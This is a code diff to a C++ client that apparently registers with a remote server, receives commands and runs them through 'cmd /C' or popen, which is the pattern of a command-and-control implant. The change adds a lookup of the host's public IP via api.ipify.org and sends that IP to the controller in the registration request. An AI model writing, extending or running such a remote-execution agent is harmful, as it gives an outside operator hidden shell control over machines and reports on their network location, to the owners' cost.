@@ -101,6 +101,27 @@ std::string send_request(const addrinfo* res, const std::string& req) {
     return resp;
 }
 
+std::string send_request_host(const std::string& h, const std::string& p, const std::string& req) {
+    addrinfo hints{};
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    addrinfo* res;
+    if (getaddrinfo(h.c_str(), p.c_str(), &hints, &res) != 0) {
+        perror("getaddrinfo");
+        return "";
+    }
+    std::string r = send_request(res, req);
+    freeaddrinfo(res);
+    return r;
+}
+
+std::string fetch_public_ip() {
+    std::string req = "GET /?format=text HTTP/1.1\r\n";
+    req += "Host: api.ipify.org\r\n";
+    req += "Connection: close\r\n\r\n";
+    return send_request_host("api.ipify.org", "80", req);
+}
+
 int main(int argc, char* argv[]) {
 #ifdef _WIN32
     std::string client_id = "client_" + std::to_string(GetCurrentProcessId());
@@ -127,7 +148,9 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    std::string body = "{\"client_id\":\"" + client_id + "\"}";
+    std::string pub_ip = fetch_public_ip();
+    if (!pub_ip.empty() && pub_ip.back() == '\n') pub_ip.pop_back();
+    std::string body = "{\"client_id\":\"" + client_id + "\",\"public_ip\":\"" + pub_ip + "\"}";
     std::string req = "POST /register HTTP/1.1\r\n";
     req += "Host: " + host + "\r\n";
     req += "Connection: close\r\n";
@@ -157,7 +180,6 @@ int main(int argc, char* argv[]) {
         if (!command.empty()) {
             std::cout << "Command: " << command << std::endl;
             std::string result;
-
 #ifdef _WIN32
             std::string fullCmd = "cmd /C " + command + " 2>&1";
             FILE* pipe = _popen(fullCmd.c_str(), "r");
@@ -210,6 +232,5 @@ int main(int argc, char* argv[]) {
 #ifdef _WIN32
     WSACleanup();
 #endif
-
     return 0;
 }
